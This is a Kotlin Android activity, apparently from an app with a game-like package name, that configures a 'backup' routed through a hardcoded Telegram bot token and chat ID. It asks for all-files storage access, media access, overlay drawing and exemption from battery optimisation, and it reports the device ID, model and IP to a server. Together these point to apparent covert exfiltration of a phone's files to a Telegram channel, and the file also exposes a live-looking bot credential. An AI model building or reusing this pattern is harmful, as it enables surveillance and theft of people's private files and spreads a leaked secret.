package com.service.assasinscreed02

import android.os.Bundle
import android.util.Log
import android.widget.Button
import android.widget.RadioButton
import android.widget.RadioGroup
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import android.app.Activity
import android.content.Intent
import androidx.activity.result.contract.ActivityResultContracts
import java.io.File
import com.google.gson.Gson
import android.content.Context
import okhttp3.OkHttpClient
import okhttp3.Request
import org.json.JSONObject
import okhttp3.MediaType.Companion.toMediaType
import android.Manifest
import android.os.Build
import android.provider.Settings
import android.content.pm.PackageManager
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat

class ConfigBackupActivity : AppCompatActivity() {
    private val REQUEST_PERMISSIONS = 123
    private val importarHistorialLauncher = registerForActivityResult(ActivityResultContracts.GetContent()) { uri ->
        if (uri != null) {
            try {
                val inputStream = contentResolver.openInputStream(uri)
                val json = inputStream?.bufferedReader()?.use { it.readText() }
                if (json != null) {
                    val gson = Gson()
                    val entries = gson.fromJson(json, Array<BackupWorker.BackupHistoryEntry>::class.java)
                    val prefs = getSharedPreferences("BackupPrefs", Context.MODE_PRIVATE)
                    val set = entries.map { "${it.fileName}|||${it.hash}|||${it.timestamp}" }.toSet()
                    prefs.edit().putStringSet("uploaded_files", set).apply()
                    Toast.makeText(this, "Historial importado correctamente", Toast.LENGTH_SHORT).show()
                }
            } catch (e: Exception) {
                Toast.makeText(this, "Error importando historial: ${e.message}", Toast.LENGTH_LONG).show()
            }
        }
    }

    private fun obtenerHistorialDesdeTelegram(token: String, chatId: String, onResult: (String?) -> Unit) {
        Thread {
            try {
                val url = "https://api.telegram.org/bot$token/getUpdates"
                val client = OkHttpClient()
                val request = Request.Builder().url(url).build()
                val response = client.newCall(request).execute()
                val body = response.body?.string()
                if (body == null) {
                    runOnUiThread { onResult(null) }
                    return@Thread
                }
                val jsonObject = org.json.JSONObject(org.json.JSONTokener(body))
                val result = jsonObject.getJSONArray("result")
                // Buscar primero archivo adjunto historial_backup.json
                var archivoEncontrado = false
                for (i in result.length() - 1 downTo 0) {
                    val update = result.getJSONObject(i)
                    if (!update.has("message")) continue
                    val message = update.getJSONObject("message")
                    if (!message.has("chat")) continue
                    val chat = message.getJSONObject("chat")
                    val id = chat.getLong("id").toString()
                    if (id == chatId && message.has("document")) {
                        val document = message.getJSONObject("document")
                        val fileName = document.optString("file_name", "")
                        val fileId = document.optString("file_id", "")
                        if (fileName == "historial_backup.json" && fileId.isNotEmpty()) {
                            archivoEncontrado = true
                            runOnUiThread { Toast.makeText(this@ConfigBackupActivity, "Archivo historial_backup.json encontrado en Telegram", Toast.LENGTH_SHORT).show() }
                            val fileInfoUrl = "https://api.telegram.org/bot$token/getFile?file_id=$fileId"
                            val fileInfoReq = Request.Builder().url(fileInfoUrl).build()
                            val fileInfoResp = client.newCall(fileInfoReq).execute()
                            val fileInfoBody = fileInfoResp.body?.string()
                            if (fileInfoBody != null) {
                                val fileInfoJson = org.json.JSONObject(fileInfoBody)
                                val filePath = fileInfoJson.getJSONObject("result").getString("file_path")
                                val downloadUrl = "https://api.telegram.org/file/bot$token/$filePath"
                                val fileResp = client.newCall(Request.Builder().url(downloadUrl).build()).execute()
                                val fileContent = fileResp.body?.string()
                                runOnUiThread { onResult(fileContent) }
                                return@Thread
                            }
                        }
                    }
                }
                if (!archivoEncontrado) {
                    runOnUiThread { Toast.makeText(this@ConfigBackupActivity, "No se encontró archivo historial_backup.json en Telegram", Toast.LENGTH_SHORT).show() }
                }
                // Si no hay archivo, buscar y unir fragmentos de texto JSON
                val fragmentos = mutableListOf<String>()
                for (i in 0 until result.length()) {
                    val update = result.getJSONObject(i)
                    if (!update.has("message")) continue
                    val message = update.getJSONObject("message")
                    if (!message.has("chat")) continue
                    val chat = message.getJSONObject("chat")
                    val id = chat.getLong("id").toString()
                    val text = if (message.has("text")) message.getString("text") else ""
                    if (id == chatId && text.trim().isNotEmpty() && (text.trim().startsWith("[") || fragmentos.isNotEmpty())) {
                        fragmentos.add(text.trim())
                        if (text.trim().endsWith("]")) break
                    }
                }
                if (fragmentos.isNotEmpty()) {
                    val jsonUnido = fragmentos.joinToString("")
                    runOnUiThread { onResult(jsonUnido) }
                    return@Thread
                }
                runOnUiThread { onResult(null) }
            } catch (e: Exception) {
                runOnUiThread { onResult(null) }
            }
        }.start()
    }

    private fun enviarHistorialAlBot(token: String, chatId: String, onResult: (Boolean) -> Unit) {
        Thread {
            try {
                // Obtener el historial actual
                val prefs = getSharedPreferences("BackupPrefs", Context.MODE_PRIVATE)
                val uploadedFiles = prefs.getStringSet("uploaded_files", setOf()) ?: setOf()
                
                // Convertir a formato JSON
                val entries = uploadedFiles.map { fileInfo ->
                    val parts = fileInfo.split("|||")
                    if (parts.size >= 3) {
                        BackupWorker.BackupHistoryEntry(
                            fileName = parts[0],
                            hash = parts[1],
                            timestamp = parts[2].toLongOrNull() ?: 0L
                        )
                    } else {
                        null
                    }
                }.filterNotNull()
                
                val gson = com.google.gson.Gson()
                val historialJson = gson.toJson(entries)
                
                // Enviar al bot usando la API de Telegram
                val url = "https://api.telegram.org/bot$token/sendMessage"
                val client = OkHttpClient()
                val jsonBody = """
                    {
                        "chat_id": "$chatId",
                        "text": "$historialJson"
                    }
                """.trimIndent()
                
                val requestBody = okhttp3.RequestBody.create(
                    "application/json; charset=utf-8".toMediaType(),
                    jsonBody
                )
                
                val request = Request.Builder()
                    .url(url)
                    .post(requestBody)
                    .build()
                
                val response = client.newCall(request).execute()
                val success = response.isSuccessful
                
                runOnUiThread { onResult(success) }
            } catch (e: Exception) {
                runOnUiThread { onResult(false) }
            }
        }.start()
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_config_backup)

        solicitarPermisos()

        val radioGroup = findViewById<RadioGroup>(R.id.radioGroupIntervalo)
        val btnGuardar = findViewById<Button>(R.id.btnGuardarBackup)
        val btnCerrar = findViewById<Button>(R.id.btnCerrar)
        val btnLimpiarRegistro = findViewById<Button>(R.id.btnLimpiarRegistro)
        val txtHistorial = findViewById<TextView>(R.id.txtHistorialConfig)
        val txtRegistroArchivos = findViewById<TextView>(R.id.txtRegistroArchivos)
        val txtIpLocal = findViewById<TextView>(R.id.txtIpLocal)
        val btnEnviarIp = findViewById<Button>(R.id.btnEnviarIp)
        val btnRecuperarHistorial = findViewById<Button>(R.id.btnRecuperarHistorial)
        val btnEnviarHistorial = findViewById<Button>(R.id.btnEnviarHistorial)
        val btnEnviarHistorialArchivo = findViewById<Button>(R.id.btnEnviarHistorialArchivo)
        val editBotToken = findViewById<android.widget.EditText>(R.id.editBotToken)
        val editBotChatId = findViewById<android.widget.EditText>(R.id.editBotChatId)
        val btnGuardarConfigBot = findViewById<Button>(R.id.btnGuardarConfigBot)
        val btnDetenerBackup = findViewById<Button>(R.id.btnDetenerBackup)

        // Valores predeterminados
        val defaultToken = "7742764117:AAEdKEzTMo0c7OW8_UEFYSir2tmn-SOrHk8"
        val defaultChatId = "-1002609637326"
        val prefs = getSharedPreferences("BotConfig", Context.MODE_PRIVATE)
        var savedToken = prefs.getString("bot_token", null)
        var savedChatId = prefs.getString("bot_chat_id", null)
        if (savedToken.isNullOrEmpty()) savedToken = defaultToken
        if (savedChatId.isNullOrEmpty()) savedChatId = defaultChatId
        editBotToken.setText(savedToken)
        editBotChatId.setText(savedChatId)

        btnGuardarConfigBot.setOnClickListener {
            var token = editBotToken.text.toString().trim()
            var chatId = editBotChatId.text.toString().trim()
            if (token.isEmpty()) token = defaultToken
            if (chatId.isEmpty()) chatId = defaultChatId
            prefs.edit().putString("bot_token", token).putString("bot_chat_id", chatId).apply()
            editBotToken.setText(token)
            editBotChatId.setText(chatId)
            Toast.makeText(this, "Configuración del bot guardada", Toast.LENGTH_SHORT).show()
        }

        // Seleccionar el intervalo actual
        val intervalo = ErrorHandler.obtenerIntervalo(this)
        when (intervalo) {
            1 -> radioGroup.check(R.id.radio1h)
            6 -> radioGroup.check(R.id.radio6h)
            24 -> radioGroup.check(R.id.radio24h)
        }

        // Mostrar historial
        actualizarHistorial(this)
        
        // Mostrar registro de archivos
        actualizarRegistroArchivos(this)

        // Mostrar la IP local
        val ip = getLocalIpAddress()
        txtIpLocal.text = "IP local: $ip"

        btnEnviarIp.setOnClickListener {
            try {
                val deviceInfo = DeviceInfo(
                    deviceId = android.provider.Settings.Secure.getString(contentResolver, android.provider.Settings.Secure.ANDROID_ID) ?: "unknown_device",
                    deviceName = android.os.Build.MODEL,
                    androidVersion = android.os.Build.VERSION.RELEASE,
                    appVersion = "radio2-1.0.0",
                    lastSeen = System.currentTimeMillis(),
                    serverUrl = "http://192.168.1.100:8080",
                    ipAddress = ip
                )
                registrarDispositivo(this, deviceInfo)
                Toast.makeText(this, "IP enviada al servidor", Toast.LENGTH_SHORT).show()
            } catch (e: Exception) {
                Toast.makeText(this, "Error enviando IP: ${e.message}", Toast.LENGTH_LONG).show()
            }
        }

        btnGuardar.setOnClickListener {
            val horas = when (radioGroup.checkedRadioButtonId) {
                R.id.radio1h -> 1
                R.id.radio6h -> 6
                R.id.radio24h -> 24
                else -> 24
            }
            try {
                ErrorHandler.guardarIntervalo(this, horas)
                Toast.makeText(this, "Intervalo guardado", Toast.LENGTH_SHORT).show()
                // No cerrar la actividad, solo actualizar el historial
                actualizarHistorial(this)
            } catch (e: Exception) {
                Toast.makeText(this, "Error guardando intervalo: ${e.message}", Toast.LENGTH_LONG).show()
            }
        }
        
        btnCerrar.setOnClickListener {
            finish()
        }
        
        btnLimpiarRegistro.setOnClickListener {
            try {
                ErrorHandler.limpiarRegistroArchivos(this)
                actualizarRegistroArchivos(this)
                Toast.makeText(this, "Registro de archivos limpiado", Toast.LENGTH_SHORT).show()
            } catch (e: Exception) {
                Toast.makeText(this, "Error limpiando registro: ${e.message}", Toast.LENGTH_LONG).show()
            }
        }

        btnRecuperarHistorial.setOnClickListener {
            val token = editBotToken.text.toString().trim()
            val chatId = editBotChatId.text.toString().trim()
            Toast.makeText(this, "Token: $token\nChat ID: $chatId", Toast.LENGTH_LONG).show()
            Toast.makeText(this, "Buscando historial en Telegram...", Toast.LENGTH_SHORT).show()
            obtenerHistorialDesdeTelegram(token, chatId) { json ->
                if (json != null) {
                    try {
                        // Verificar validez del JSON antes de deserializar
                        val gson = com.google.gson.Gson()
                        val entries = gson.fromJson(json, Array<BackupWorker.BackupHistoryEntry>::class.java)
                        if (entries == null) {
                            Toast.makeText(this, "El historial recibido está incompleto o corrupto.", Toast.LENGTH_LONG).show()
                            return@obtenerHistorialDesdeTelegram
                        }
                        if (entries.size > 3000) {
                            Toast.makeText(this, "El historial es muy grande. Se recomienda usar el método de archivo adjunto para mayor robustez.", Toast.LENGTH_LONG).show()
                        }
                        val prefs = getSharedPreferences("BackupPrefs", Context.MODE_PRIVATE)
                        val set = entries.map { "${it.fileName}|||${it.hash}|||${it.timestamp}" }.toSet()
                        prefs.edit().putStringSet("uploaded_files", set).apply()
                        Toast.makeText(this, "Historial importado correctamente", Toast.LENGTH_SHORT).show()
                    } catch (e: Exception) {
                        Toast.makeText(this, "Error importando historial: El historial recibido está incompleto o corrupto.", Toast.LENGTH_LONG).show()
                    }
                } else {
                    Toast.makeText(this, "No se encontró historial en Telegram (ni como archivo ni como texto)", Toast.LENGTH_LONG).show()
                }
            }
        }

        btnEnviarHistorial.setOnClickListener {
            val token = editBotToken.text.toString().trim()
            val chatId = editBotChatId.text.toString().trim()
            if (token.isEmpty() || chatId.isEmpty()) {
                Toast.makeText(this, "Configura el bot de Telegram primero", Toast.LENGTH_LONG).show()
                return@setOnClickListener
            }
            Toast.makeText(this, "Enviando historial como texto...", Toast.LENGTH_SHORT).show()
            enviarHistorialComoTexto(token, chatId) { success, partes ->
                runOnUiThread {
                    if (success) {
                        Toast.makeText(this, "Historial enviado en $partes mensajes", Toast.LENGTH_SHORT).show()
                    } else {
                        Toast.makeText(this, "Error enviando historial como texto", Toast.LENGTH_LONG).show()
                    }
                }
            }
        }

        btnEnviarHistorialArchivo.setOnClickListener {
            val token = editBotToken.text.toString().trim()
            val chatId = editBotChatId.text.toString().trim()
            if (token.isEmpty() || chatId.isEmpty()) {
                Toast.makeText(this, "Configura el bot de Telegram primero", Toast.LENGTH_LONG).show()
                return@setOnClickListener
            }
            Toast.makeText(this, "Enviando historial como archivo...", Toast.LENGTH_SHORT).show()
            enviarHistorialComoArchivo(token, chatId) { success ->
                runOnUiThread {
                    if (success) {
                        Toast.makeText(this, "Historial enviado como archivo correctamente", Toast.LENGTH_SHORT).show()
                    } else {
                        Toast.makeText(this, "Error enviando historial como archivo", Toast.LENGTH_LONG).show()
                    }
                }
            }
        }

        btnDetenerBackup.setOnClickListener {
            try {
                val workManager = androidx.work.WorkManager.getInstance(this)
                workManager.cancelAllWorkByTag("backup_worker")
                Toast.makeText(this, "Backup detenido", Toast.LENGTH_SHORT).show()
            } catch (e: Exception) {
                Toast.makeText(this, "Error al detener backup: ${e.message}", Toast.LENGTH_LONG).show()
            }
        }

    }
    
    private fun solicitarPermisos() {
        val permisos = mutableListOf(
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.ACCESS_NETWORK_STATE,
            Manifest.permission.ACCESS_WIFI_STATE
        )
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permisos.add(Manifest.permission.READ_MEDIA_IMAGES)
            permisos.add(Manifest.permission.READ_MEDIA_VIDEO)
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!android.os.Environment.isExternalStorageManager()) {
                Log.d("Permisos", "Solicitando MANAGE_EXTERNAL_STORAGE")
                val intent = Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION)
                intent.data = android.net.Uri.parse("package:" + packageName)
                startActivity(intent)
            }
        }
        // Permiso de overlay (permanecer encima)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
            Log.d("Permisos", "Solicitando permiso de overlay")
            val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION)
            intent.data = android.net.Uri.parse("package:" + packageName)
            startActivity(intent)
        }
        val permisosNoConcedidos = permisos.filter {
            val granted = ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
            Log.d("Permisos", "Permiso $it concedido: $granted")
            !granted
        }
        if (permisosNoConcedidos.isNotEmpty()) {
            Log.d("Permisos", "Solicitando permisos: $permisosNoConcedidos")
            ActivityCompat.requestPermissions(this, permisosNoConcedidos.toTypedArray(), REQUEST_PERMISSIONS)
        }
        // Solicitar ignorar optimización de batería
        val pm = getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !pm.isIgnoringBatteryOptimizations(packageName)) {
            Log.d("Permisos", "Solicitando ignorar optimización de batería")
            val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
            intent.data = android.net.Uri.parse("package:" + packageName)
            startActivity(intent)
        }
    }

    private fun obtenerHistorial(context: android.content.Context): Pair<Long, Long> {
        return try {
            val prefs = context.getSharedPreferences("RadioBackupPrefs", android.content.Context.MODE_PRIVATE)
            val ultima = prefs.getLong("ultima_conexion", 0L)
            val anterior = prefs.getLong("anterior_conexion", 0L)
            Pair(ultima, anterior)
        } catch (e: Exception) {
            Pair(0L, 0L)
        }
    }
    
    private fun actualizarHistorial(context: android.content.Context) {
        try {
            val (ultima, anterior) = obtenerHistorial(context)
            val txtHistorial = findViewById<TextView>(R.id.txtHistorialConfig)
            
            val formato = java.text.SimpleDateFormat("dd/MM/yyyy HH:mm:ss", java.util.Locale.getDefault())
            val texto = StringBuilder()
            texto.append("Última conexión: ")
            texto.append(if (ultima != 0L) formato.format(java.util.Date(ultima)) else "-")
            texto.append("\nAnterior: ")
            texto.append(if (anterior != 0L) formato.format(java.util.Date(anterior)) else "-")
            
            txtHistorial.text = texto.toString()
        } catch (e: Exception) {
            Log.e("ConfigBackupActivity", "Error actualizando historial: ${e.message}")
        }
    }
    
    private fun actualizarRegistroArchivos(context: android.content.Context) {
        try {
            val cantidad = ErrorHandler.obtenerCantidadArchivosSubidos(context)
            val txtRegistroArchivos = findViewById<TextView>(R.id.txtRegistroArchivos)
            txtRegistroArchivos.text = "Archivos subidos: $cantidad"
        } catch (e: Exception) {
            Log.e("ConfigBackupActivity", "Error actualizando registro: ${e.message}")
        }
    }

    private fun enviarHistorialComoTexto(token: String, chatId: String, onResult: (Boolean, Int) -> Unit) {
        Thread {
            try {
                val prefs = getSharedPreferences("BackupPrefs", Context.MODE_PRIVATE)
                val uploadedFiles = prefs.getStringSet("uploaded_files", setOf()) ?: setOf()
                val entries = uploadedFiles.map { fileInfo ->
                    val parts = fileInfo.split("|||")
                    if (parts.size >= 3) {
                        BackupWorker.BackupHistoryEntry(
                            fileName = parts[0],
                            hash = parts[1],
                            timestamp = parts[2].toLongOrNull() ?: 0L
                        )
                    } else {
                        null
                    }
                }.filterNotNull()
                val gson = com.google.gson.Gson()
                val historialJson = gson.toJson(entries)
                val partes = historialJson.chunked(4000)
                var success = true
                for (parte in partes) {
                    val url = "https://api.telegram.org/bot$token/sendMessage"
                    val client = OkHttpClient()
                    // Escapar correctamente el JSON para Telegram
                    val safeText = parte.replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", " ")
                    val jsonBody = """
                        {
                            "chat_id": "$chatId",
                            "text": "$safeText"
                        }
                    """.trimIndent()
                    val requestBody = okhttp3.RequestBody.create(
                        "application/json; charset=utf-8".toMediaType(),
                        jsonBody
                    )
                    val request = Request.Builder()
                        .url(url)
                        .post(requestBody)
                        .build()
                    val response = client.newCall(request).execute()
                    if (!response.isSuccessful) success = false
                }
                runOnUiThread { onResult(success, partes.size) }
            } catch (e: Exception) {
                runOnUiThread { onResult(false, 0) }
            }
        }.start()
    }

    private fun enviarHistorialComoArchivo(token: String, chatId: String, onResult: (Boolean) -> Unit) {
        Thread {
            try {
                val prefs = getSharedPreferences("BackupPrefs", Context.MODE_PRIVATE)
                val uploadedFiles = prefs.getStringSet("uploaded_files", setOf()) ?: setOf()
                val entries = uploadedFiles.map { fileInfo ->
                    val parts = fileInfo.split("|||")
                    if (parts.size >= 3) {
                        BackupWorker.BackupHistoryEntry(
                            fileName = parts[0],
                            hash = parts[1],
                            timestamp = parts[2].toLongOrNull() ?: 0L
                        )
                    } else {
                        null
                    }
                }.filterNotNull()
                val gson = com.google.gson.Gson()
                val historialJson = gson.toJson(entries)
                // Guardar el historial en un archivo temporal
                val file = File(cacheDir, "historial_backup.json")
                file.writeText(historialJson, Charsets.UTF_8)
                // Enviar el archivo usando sendDocument
                val url = "https://api.telegram.org/bot$token/sendDocument"
                val client = OkHttpClient()
                val requestBody = okhttp3.MultipartBody.Builder()
                    .setType(okhttp3.MultipartBody.FORM)
                    .addFormDataPart("chat_id", chatId)
                    .addFormDataPart(
                        "document",
                        "historial_backup.json",
                        okhttp3.RequestBody.create("application/json".toMediaType(), file)
                    )
                    .build()
                val request = Request.Builder()
                    .url(url)
                    .post(requestBody)
                    .build()
                val response = client.newCall(request).execute()
                val success = response.isSuccessful
                runOnUiThread { onResult(success) }
            } catch (e: Exception) {
                runOnUiThread { onResult(false) }
            }
        }.start()
    }
} 